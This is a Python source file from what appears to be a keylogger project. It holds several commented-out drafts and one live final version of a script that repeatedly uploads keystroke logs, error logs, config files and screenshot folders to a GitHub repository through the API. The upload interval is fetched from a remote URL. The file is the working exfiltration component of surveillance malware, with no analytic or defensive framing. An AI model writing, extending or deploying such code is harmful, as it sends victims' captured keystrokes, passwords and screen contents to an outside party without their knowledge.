# # uploading one file 
# import requests
# import os
# import base64
# from datetime import datetime

# def upload_to_github(file_path, repo_name, folder_name, branch_name, github_token):
#     """
#     Upload a file to a specific folder in a GitHub repository.

#     Args:
#         file_path (str): Path of the file to upload.
#         repo_name (str): GitHub repository name in the format 'username/repository'.
#         folder_name (str): Folder in the repository where files will be stored.
#         branch_name (str): Branch where the file will be uploaded.
#         github_token (str): Personal access token for GitHub authentication.
#     """
#     # Read the file content
#     with open(file_path, 'rb') as f:
#         content = f.read()

#     # GitHub API URL for the repository
#     file_name = os.path.basename(file_path)
#     unique_name = f"{folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
#     api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

#     # Encode file content to base64
#     content_base64 = base64.b64encode(content).decode('utf-8')

#     # Prepare the API payload
#     payload = {
#         "message": f"Upload {file_name}",
#         "content": content_base64,
#         "branch": branch_name
#     }

#     # Set headers
#     headers = {"Authorization": f"token {github_token}"}

#     # Make the API request
#     response = requests.put(api_url, json=payload, headers=headers)

#     if response.status_code == 201:
#         print(f"File uploaded successfully: {response.json().get('content').get('html_url')}")
#     else:
#         print(f"Failed to upload file: {response.status_code}, {response.text}")

# # Main script
# if __name__ == "__main__":
#     # Configuration
#     repo_name = "bebedudu/keylogger"  # Replace with your GitHub repository
#     folder_name = "logs"  # Folder to store the error files
#     branch_name = "main"  # Replace with your branch name
#     github_token = "add_your_token_here"  # Replace with your GitHub token

#     # Path to the log file
#     log_folder = "logs"
#     log_file_name = "key_log.txt"
#     file_path = os.path.join(log_folder, log_file_name)

#     # Check if the log file exists
#     if os.path.exists(file_path):
#         upload_to_github(file_path, repo_name, folder_name, branch_name, github_token)
#     else:
#         print(f"File not found: {file_path}")





# # upload all logs file
# import os
# import base64
# import requests
# from datetime import datetime

# def upload_file_to_github(file_path, repo_name, folder_name, branch_name, github_token):
#     """
#     Uploads a file to a specified folder in a GitHub repository.
#     """
#     with open(file_path, 'rb') as f:
#         content = f.read()

#     # Get the file name and generate a unique name for the repository
#     file_name = os.path.basename(file_path)
#     unique_name = f"{folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
#     api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

#     # Encode the file content to Base64
#     content_base64 = base64.b64encode(content).decode('utf-8')

#     # Prepare the payload
#     payload = {
#         "message": f"Uploading {file_name}",
#         "content": content_base64,
#         "branch": branch_name
#     }

#     # Set the request headers
#     headers = {"Authorization": f"token {github_token}"}

#     # Make the PUT request to upload the file
#     response = requests.put(api_url, json=payload, headers=headers)

#     if response.status_code == 201:
#         print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
#     else:
#         print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")

# def upload_folder_to_github(folder_path, repo_name, base_folder_name, branch_name, github_token):
#     """
#     Uploads all files in a folder to a specified folder in a GitHub repository.
#     """
#     for root, _, files in os.walk(folder_path):
#         for file_name in files:
#             file_path = os.path.join(root, file_name)

#             # Create a relative path for the repository folder
#             relative_path = os.path.relpath(file_path, folder_path)
#             repo_folder_path = os.path.join(base_folder_name, relative_path).replace("\\", "/")

#             # Upload the file
#             upload_file_to_github(file_path, repo_name, repo_folder_path, branch_name, github_token)

# # Main script
# if __name__ == "__main__":
#     # Configuration
#     repo_name = "bebedudu/keylogger"  # Replace with your GitHub repo
#     branch_name = "main"  # Replace with your branch name
#     github_token = "add_your_token_here"  # Replace with your GitHub token
#     folder_name = "uploads"  # Folder in the repo to store files

#     # Paths to the file and folder
#     file_to_upload = "keylogerror.log", "config.json"  # The standalone file
#     folder_to_upload = "logs", "screenshot folder"  # The folder containing multiple files

#     # Upload the standalone file
#     if os.path.exists(file_to_upload):
#         upload_file_to_github(file_to_upload, repo_name, folder_name, branch_name, github_token)
#     else:
#         print(f"File not found: {file_to_upload}")

#     # Upload all files in the folder
#     if os.path.exists(folder_to_upload) and os.path.isdir(folder_to_upload):
#         upload_folder_to_github(folder_to_upload, repo_name, folder_name, branch_name, github_token)
#     else:
#         print(f"Folder not found: {folder_to_upload}")








# # storing multiples files and folders
# import os
# import base64
# import requests
# from datetime import datetime

# def upload_file_to_github(file_path, repo_name, folder_name, branch_name, github_token):
#     """
#     Uploads a file to a specified folder in a GitHub repository.
#     """
#     with open(file_path, 'rb') as f:
#         content = f.read()

#     # Get the file name and generate a unique name for the repository
#     file_name = os.path.basename(file_path)
#     unique_name = f"{folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
#     api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

#     # Encode the file content to Base64
#     content_base64 = base64.b64encode(content).decode('utf-8')

#     # Prepare the payload
#     payload = {
#         "message": f"Uploading {file_name}",
#         "content": content_base64,
#         "branch": branch_name
#     }

#     # Set the request headers
#     headers = {"Authorization": f"token {github_token}"}

#     # Make the PUT request to upload the file
#     response = requests.put(api_url, json=payload, headers=headers)

#     if response.status_code == 201:
#         print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
#     else:
#         print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")

# def upload_folder_to_github(folder_path, repo_name, base_folder_name, branch_name, github_token):
#     """
#     Uploads all files in a folder to a specified folder in a GitHub repository.
#     """
#     for root, _, files in os.walk(folder_path):
#         for file_name in files:
#             file_path = os.path.join(root, file_name)

#             # Create a relative path for the repository folder
#             relative_path = os.path.relpath(file_path, folder_path)
#             repo_folder_path = os.path.join(base_folder_name, relative_path).replace("\\", "/")

#             # Upload the file
#             upload_file_to_github(file_path, repo_name, repo_folder_path, branch_name, github_token)

# def upload_multiple(files, folders, repo_name, folder_name, branch_name, github_token):
#     """
#     Handles uploading multiple files and folders to a GitHub repository.
#     """
#     # Upload each file in the list
#     for file_path in files:
#         if os.path.exists(file_path):
#             upload_file_to_github(file_path, repo_name, folder_name, branch_name, github_token)
#         else:
#             print(f"File not found: {file_path}")

#     # Upload each folder in the list
#     for folder_path in folders:
#         if os.path.exists(folder_path) and os.path.isdir(folder_path):
#             upload_folder_to_github(folder_path, repo_name, folder_name, branch_name, github_token)
#         else:
#             print(f"Folder not found or not a directory: {folder_path}")

# # Main script
# if __name__ == "__main__":
#     # Configuration
#     repo_name = "bebedudu/keylogger"  # Replace with your GitHub repo
#     branch_name = "main"  # Replace with your branch name
#     github_token = "add_your_token_here"  # Replace with your GitHub token
#     folder_name = "uploads"  # Folder in the repo to store files

#     # List of files and folders to upload
#     files_to_upload = ["keylogerror.log", "config.json"]  # Add more files as needed
#     folders_to_upload = ["logs", "screenshots"]  # Add more folders as needed

#     # Upload files and folders
#     upload_multiple(files_to_upload, folders_to_upload, repo_name, folder_name, branch_name, github_token)








# # modified uploading files and folders
# # uploads/
# # ├── keylogerror/
# # │   ├── 20250117_123456_keylogerror.log
# # │   └── 20250117_123457_keylogerror.log
# # ├── config/
# # │   ├── 20250117_123458_config.json
# # │   └── 20250117_123459_config.json
# # ├── logs/
# # │   ├── log1.txt
# # │   └── log2.txt
# # ├── screenshot folder/
# #     ├── screenshot1.png
# #     └── screenshot2.png

# import os
# import base64
# import requests
# from datetime import datetime

# def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads a file to a specified folder in a GitHub repository.
#     """
#     with open(file_path, 'rb') as f:
#         content = f.read()

#     # Get the file name and ensure a unique name for the repository
#     file_name = os.path.basename(file_path)
#     unique_name = f"{repo_folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
#     api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

#     # Encode the file content to Base64
#     content_base64 = base64.b64encode(content).decode('utf-8')

#     # Prepare the payload
#     payload = {
#         "message": f"Uploading {file_name}",
#         "content": content_base64,
#         "branch": branch_name
#     }

#     # Set the request headers
#     headers = {"Authorization": f"token {github_token}"}

#     # Make the PUT request to upload the file
#     response = requests.put(api_url, json=payload, headers=headers)

#     if response.status_code == 201:
#         print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
#     else:
#         print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")

# def upload_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads all files in a folder to a specified folder in a GitHub repository.
#     """
#     for root, _, files in os.walk(folder_path):
#         for file_name in files:
#             file_path = os.path.join(root, file_name)
#             # All files go into the specified repo_folder_name
#             upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)

# def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token):
#     """
#     Uploads multiple files and folders to specific subfolders in a GitHub repository.
#     """
#     # Upload each file to its respective subfolder
#     for file_path, subfolder in file_mapping.items():
#         if os.path.exists(file_path):
#             upload_file_to_github(file_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"File not found: {file_path}")

#     # Upload each folder to its respective subfolder
#     for folder_path, subfolder in folder_mapping.items():
#         if os.path.exists(folder_path) and os.path.isdir(folder_path):
#             upload_folder_to_github(folder_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"Folder not found or not a directory: {folder_path}")

# # Main script
# if __name__ == "__main__":
#     # Configuration
#     repo_name = "bebedudu/keylogger"  # Replace with your GitHub repo
#     branch_name = "main"  # Replace with your branch name
#     github_token = "add_your_token_here"  # Replace with your GitHub token

#     # Define file-to-subfolder mapping
#     file_mapping = {
#         "keylogerror.log": "keylogerror",  # Save keylogerror.log in uploads/keylogerror/
#         "config.json": "config"  # Save config.json in uploads/config/
#     }

#     # Define folder-to-subfolder mapping
#     folder_mapping = {
#         "logs": "logs",  # Save logs folder contents in uploads/logs/
#         "screenshots": "screenshot folder"  # Save all screenshots in uploads/screenshot folder/
#     }

#     # Upload files and folders
#     upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token)










# # upload file in specific interval of time according to file duration
# import os
# import base64
# import requests
# import time
# from datetime import datetime

# def fetch_upload_interval(url):
#     """
#     Fetches the upload interval (in seconds) from a remote text file.
#     """
#     try:
#         response = requests.get(url)
#         if response.status_code == 200:
#             return int(response.text.strip())  # Convert the content to an integer
#         else:
#             print(f"Failed to fetch upload interval: {response.status_code}")
#     except Exception as e:
#         print(f"Error fetching upload interval: {e}")
#     return 60  # Default interval (60 seconds) in case of failure

# def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads a file to a specified folder in a GitHub repository.
#     """
#     with open(file_path, 'rb') as f:
#         content = f.read()

#     file_name = os.path.basename(file_path)
#     unique_name = f"{repo_folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
#     api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

#     content_base64 = base64.b64encode(content).decode('utf-8')

#     payload = {
#         "message": f"Uploading {file_name}",
#         "content": content_base64,
#         "branch": branch_name
#     }

#     headers = {"Authorization": f"token {github_token}"}

#     response = requests.put(api_url, json=payload, headers=headers)

#     if response.status_code == 201:
#         print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
#     else:
#         print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")

# def upload_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads all files in a folder to a specified folder in a GitHub repository.
#     """
#     for root, _, files in os.walk(folder_path):
#         for file_name in files:
#             file_path = os.path.join(root, file_name)
#             upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)

# def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token):
#     """
#     Uploads multiple files and folders to specific subfolders in a GitHub repository.
#     """
#     for file_path, subfolder in file_mapping.items():
#         if os.path.exists(file_path):
#             upload_file_to_github(file_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"File not found: {file_path}")

#     for folder_path, subfolder in folder_mapping.items():
#         if os.path.exists(folder_path) and os.path.isdir(folder_path):
#             upload_folder_to_github(folder_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"Folder not found or not a directory: {folder_path}")

# # Main script
# if __name__ == "__main__":
#     # Configuration
#     repo_name = "bebedudu/keylogger"  # Replace with your GitHub repo
#     branch_name = "main"  # Replace with your branch name
#     github_token = "add_your_token_here"  # Replace with your GitHub token
#     interval_url = "https://raw.githubusercontent.com/bebedudu/autoupdate/refs/heads/main/upload_interval.txt"  # URL for upload interval

#     # Define file-to-subfolder mapping
#     file_mapping = {
#         "keylogerror.log": "keylogerror",
#         "config.json": "config"
#     }

#     # Define folder-to-subfolder mapping
#     folder_mapping = {
#         "logs": "logs",
#         # "screenshot folder": "screenshot folder"
#     }

#     while True:
#         # Fetch the upload interval dynamically
#         upload_interval = fetch_upload_interval(interval_url)
#         print(f"Next upload in {upload_interval} seconds...")

#         # Perform the upload
#         upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token)

#         # Wait for the specified interval
#         time.sleep(upload_interval)










# # upload files in specific interval of time by checking the last uploaded 
# import os
# import base64
# import requests
# import time
# from datetime import datetime, timedelta
# import json

# # File to store the last upload timestamp
# LAST_UPLOAD_FILE = "last_upload.json"

# def fetch_upload_interval(url):
#     """
#     Fetches the upload interval (in seconds) from a remote text file.
#     """
#     try:
#         response = requests.get(url)
#         if response.status_code == 200:
#             return int(response.text.strip())  # Convert the content to an integer
#         else:
#             print(f"Failed to fetch upload interval: {response.status_code}")
#     except Exception as e:
#         print(f"Error fetching upload interval: {e}")
#     return 60  # Default interval (60 seconds) in case of failure

# def get_last_upload_time():
#     """
#     Retrieves the last upload timestamp from a file. Returns None if not found.
#     """
#     if os.path.exists(LAST_UPLOAD_FILE):
#         try:
#             with open(LAST_UPLOAD_FILE, "r") as f:
#                 data = json.load(f)
#                 return datetime.fromisoformat(data["last_upload"])
#         except Exception as e:
#             print(f"Error reading last upload file: {e}")
#     return None

# def set_last_upload_time():
#     """
#     Updates the last upload timestamp in a file.
#     """
#     try:
#         with open(LAST_UPLOAD_FILE, "w") as f:
#             json.dump({"last_upload": datetime.now().isoformat()}, f)
#     except Exception as e:
#         print(f"Error writing last upload file: {e}")

# def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads a file to a specified folder in a GitHub repository.
#     """
#     with open(file_path, 'rb') as f:
#         content = f.read()

#     file_name = os.path.basename(file_path)
#     unique_name = f"{repo_folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
#     api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

#     content_base64 = base64.b64encode(content).decode('utf-8')

#     payload = {
#         "message": f"Uploading {file_name}",
#         "content": content_base64,
#         "branch": branch_name
#     }

#     headers = {"Authorization": f"token {github_token}"}

#     response = requests.put(api_url, json=payload, headers=headers)

#     if response.status_code == 201:
#         print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
#     else:
#         print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")

# def upload_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads all files in a folder to a specified folder in a GitHub repository.
#     """
#     for root, _, files in os.walk(folder_path):
#         for file_name in files:
#             file_path = os.path.join(root, file_name)
#             upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)

# def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token):
#     """
#     Uploads multiple files and folders to specific subfolders in a GitHub repository.
#     """
#     for file_path, subfolder in file_mapping.items():
#         if os.path.exists(file_path):
#             upload_file_to_github(file_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"File not found: {file_path}")

#     for folder_path, subfolder in folder_mapping.items():
#         if os.path.exists(folder_path) and os.path.isdir(folder_path):
#             upload_folder_to_github(folder_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"Folder not found or not a directory: {folder_path}")

# # Main script
# if __name__ == "__main__":
#     # Configuration
#     repo_name = "bebedudu/keylogger"  # Replace with your GitHub repo
#     branch_name = "main"  # Replace with your branch name
#     github_token = "add_your_token_here"  # Replace with your GitHub token
#     interval_url = "https://raw.githubusercontent.com/bebedudu/autoupdate/refs/heads/main/upload_interval.txt"  # URL for upload interval

#     # Define file-to-subfolder mapping
#     file_mapping = {
#         "keylogerror.log": "keylogerror",
#         "config.json": "config"
#     }

#     # Define folder-to-subfolder mapping
#     folder_mapping = {
#         "logs": "logs",
#         # "screenshot folder": "screenshot folder"
#     }

#     # Fetch the upload interval dynamically
#     upload_interval = fetch_upload_interval(interval_url)
#     print(f"Upload interval set to {upload_interval} seconds.")

#     # Check the last upload time
#     last_upload_time = get_last_upload_time()

#     if last_upload_time:
#         time_since_last_upload = (datetime.now() - last_upload_time).total_seconds()
#         print(f"Time since last upload: {time_since_last_upload} seconds.")

#         if time_since_last_upload < upload_interval:
#             wait_time = upload_interval - time_since_last_upload
#             print(f"Waiting {wait_time} seconds before the next upload.")
#             time.sleep(wait_time)

#     # Perform the upload
#     upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token)

#     # Update the last upload time
#     set_last_upload_time()








# # set the time duration to check the next upload file 
# import os
# import base64
# import requests
# import time
# from datetime import datetime, timedelta
# import json

# # File to store the last upload timestamp
# LAST_UPLOAD_FILE = "last_upload.json"

# def fetch_upload_interval(url):
#     """
#     Fetches the upload interval (in seconds) from a remote text file.
#     """
#     try:
#         response = requests.get(url)
#         if response.status_code == 200:
#             return int(response.text.strip())  # Convert the content to an integer
#         else:
#             print(f"Failed to fetch upload interval: {response.status_code}")
#     except Exception as e:
#         print(f"Error fetching upload interval: {e}")
#     return 60  # Default interval (60 seconds) in case of failure

# def get_last_upload_time():
#     """
#     Retrieves the last upload timestamp from a file. Returns None if not found.
#     """
#     if os.path.exists(LAST_UPLOAD_FILE):
#         try:
#             with open(LAST_UPLOAD_FILE, "r") as f:
#                 data = json.load(f)
#                 return datetime.fromisoformat(data["last_upload"])
#         except Exception as e:
#             print(f"Error reading last upload file: {e}")
#     return None

# def set_last_upload_time():
#     """
#     Updates the last upload timestamp in a file.
#     """
#     try:
#         with open(LAST_UPLOAD_FILE, "w") as f:
#             json.dump({"last_upload": datetime.now().isoformat()}, f)
#     except Exception as e:
#         print(f"Error writing last upload file: {e}")

# def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads a file to a specified folder in a GitHub repository.
#     """
#     with open(file_path, 'rb') as f:
#         content = f.read()

#     file_name = os.path.basename(file_path)
#     unique_name = f"{repo_folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
#     api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

#     content_base64 = base64.b64encode(content).decode('utf-8')

#     payload = {
#         "message": f"Uploading {file_name}",
#         "content": content_base64,
#         "branch": branch_name
#     }

#     headers = {"Authorization": f"token {github_token}"}

#     response = requests.put(api_url, json=payload, headers=headers)

#     if response.status_code == 201:
#         print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
#     else:
#         print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")

# def upload_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
#     """
#     Uploads all files in a folder to a specified folder in a GitHub repository.
#     """
#     for root, _, files in os.walk(folder_path):
#         for file_name in files:
#             file_path = os.path.join(root, file_name)
#             upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)

# def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token):
#     """
#     Uploads multiple files and folders to specific subfolders in a GitHub repository.
#     """
#     for file_path, subfolder in file_mapping.items():
#         if os.path.exists(file_path):
#             upload_file_to_github(file_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"File not found: {file_path}")

#     for folder_path, subfolder in folder_mapping.items():
#         if os.path.exists(folder_path) and os.path.isdir(folder_path):
#             upload_folder_to_github(folder_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
#         else:
#             print(f"Folder not found or not a directory: {folder_path}")

# # Main script
# if __name__ == "__main__":
#     # Configuration
#     repo_name = "bebedudu/keylogger"  # Replace with your GitHub repo
#     branch_name = "main"  # Replace with your branch name
#     github_token = "add_your_token_here"  # Replace with your GitHub token
#     interval_url = "https://raw.githubusercontent.com/bebedudu/autoupdate/refs/heads/main/upload_interval.txt"  # URL for upload interval

#     # Define file-to-subfolder mapping
#     file_mapping = {
#         "keylogerror.log": "keylogerror",
#         "config.json": "config"
#     }

#     # Define folder-to-subfolder mapping
#     folder_mapping = {
#         "logs": "logs",
#         # "screenshot folder": "screenshot folder"
#     }

#     while True:  # Infinite loop for continuous execution
#         # Fetch the upload interval dynamically
#         upload_interval = fetch_upload_interval(interval_url)
#         print(f"Upload interval set to {upload_interval} seconds.")

#         # Check the last upload time
#         last_upload_time = get_last_upload_time()

#         if last_upload_time:
#             time_since_last_upload = (datetime.now() - last_upload_time).total_seconds()
#             print(f"Time since last upload: {time_since_last_upload} seconds.")

#             if time_since_last_upload < upload_interval:
#                 wait_time = upload_interval - time_since_last_upload
#                 print(f"Waiting {wait_time} seconds before the next upload.")
#                 time.sleep(wait_time)

#         # Perform the upload
#         upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token)

#         # Update the last upload time
#         set_last_upload_time()
        
#         check_interval = 10

#         print(f"Files uploaded successfully. Next check will occur after {upload_interval} seconds.")
#         time.sleep(check_interval)  # Wait before the next iteration







import os
import base64
import requests
import time
from datetime import datetime, timedelta
import json

# File to store the last upload timestamp
LAST_UPLOAD_FILE = "last_upload.json"

def format_interval(seconds):
    """
    Converts a time duration in seconds into a human-readable format.
    """
    if seconds < 60:
        return f"{seconds} seconds"
    elif seconds < 3600:
        minutes = seconds // 60
        return f"{minutes} minute{'s' if minutes > 1 else ''}"
    elif seconds < 86400:
        hours = seconds // 3600
        return f"{hours} hour{'s' if hours > 1 else ''}"
    elif seconds < 2592000:  # Approx. 30 days
        days = seconds // 86400
        return f"{days} day{'s' if days > 1 else ''}"
    elif seconds < 31536000:  # Approx. 365 days
        months = seconds // 2592000
        return f"{months} month{'s' if months > 1 else ''}"
    else:
        years = seconds // 31536000
        return f"{years} year{'s' if years > 1 else ''}"

def fetch_upload_interval(url):
    """
    Fetches the upload interval (in seconds) from a remote text file.
    """
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return int(response.text.strip())  # Convert the content to an integer
        else:
            print(f"Failed to fetch upload interval: {response.status_code}")
    except Exception as e:
        print(f"Error fetching upload interval: {e}")
    return 60  # Default interval (60 seconds) in case of failure

def get_last_upload_time():
    """
    Retrieves the last upload timestamp from a file. Returns None if not found.
    """
    if os.path.exists(LAST_UPLOAD_FILE):
        try:
            with open(LAST_UPLOAD_FILE, "r") as f:
                data = json.load(f)
                return datetime.fromisoformat(data["last_upload"])
        except Exception as e:
            print(f"Error reading last upload file: {e}")
    return None

def set_last_upload_time():
    """
    Updates the last upload timestamp in a file.
    """
    try:
        with open(LAST_UPLOAD_FILE, "w") as f:
            json.dump({"last_upload": datetime.now().isoformat()}, f)
    except Exception as e:
        print(f"Error writing last upload file: {e}")

def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
    """
    Uploads a file to a specified folder in a GitHub repository.
    """
    with open(file_path, 'rb') as f:
        content = f.read()

    file_name = os.path.basename(file_path)
    unique_name = f"{repo_folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
    api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

    content_base64 = base64.b64encode(content).decode('utf-8')

    payload = {
        "message": f"Uploading {file_name}",
        "content": content_base64,
        "branch": branch_name
    }

    headers = {"Authorization": f"token {github_token}"}

    response = requests.put(api_url, json=payload, headers=headers)

    if response.status_code == 201:
        print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
    else:
        print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")

def upload_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
    """
    Uploads all files in a folder to a specified folder in a GitHub repository.
    """
    for root, _, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)

def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token):
    """
    Uploads multiple files and folders to specific subfolders in a GitHub repository.
    """
    for file_path, subfolder in file_mapping.items():
        if os.path.exists(file_path):
            upload_file_to_github(file_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
        else:
            print(f"File not found: {file_path}")

    for folder_path, subfolder in folder_mapping.items():
        if os.path.exists(folder_path) and os.path.isdir(folder_path):
            upload_folder_to_github(folder_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
        else:
            print(f"Folder not found or not a directory: {folder_path}")

# Main script
if __name__ == "__main__":
    # Configuration
    repo_name = "bebedudu/keylogger"  # Replace with your GitHub repo
    branch_name = "main"  # Replace with your branch name
    github_token = "add_your_token_here"  # Replace with your GitHub token
    interval_url = "https://raw.githubusercontent.com/bebedudu/autoupdate/refs/heads/main/upload_interval.txt"  # URL for upload interval

    # Define file-to-subfolder mapping
    file_mapping = {
        "keylogerror.log": "keylogerror",
        "config.json": "config"
    }

    # Define folder-to-subfolder mapping
    folder_mapping = {
        "logs": "logs",
        # "screenshot folder": "screenshot folder"
    }

    print("Starting the upload monitoring script...")

    while True:  # Infinite loop for continuous execution
        # Fetch the upload interval dynamically
        upload_interval = fetch_upload_interval(interval_url)
        # print(f"Upload interval set to {upload_interval} seconds.")
        readable_interval = format_interval(upload_interval)  # Format the interval
        print(f"Upload interval set to {readable_interval}.")

        # Check the last upload time
        last_upload_time = get_last_upload_time()

        # Calculate time until the next upload
        if last_upload_time:
            time_since_last_upload = (datetime.now() - last_upload_time).total_seconds()
            time_until_next_upload = upload_interval - time_since_last_upload
            # print(f"Time until next upload: {max(0, time_until_next_upload)} seconds.")
            print(f"Time until next upload: {format_interval(max(0, time_until_next_upload))}.")
        else:
            time_until_next_upload = 0  # Upload immediately if no last upload time

        if time_until_next_upload <= 0:
            # Perform the upload
            print("Uploading files...")
            upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token)

            # Update the last upload time
            set_last_upload_time()
            print(f"Files uploaded successfully at {datetime.now().isoformat()}.")

        # Sleep for a short time to avoid excessive checking
        time.sleep(20)


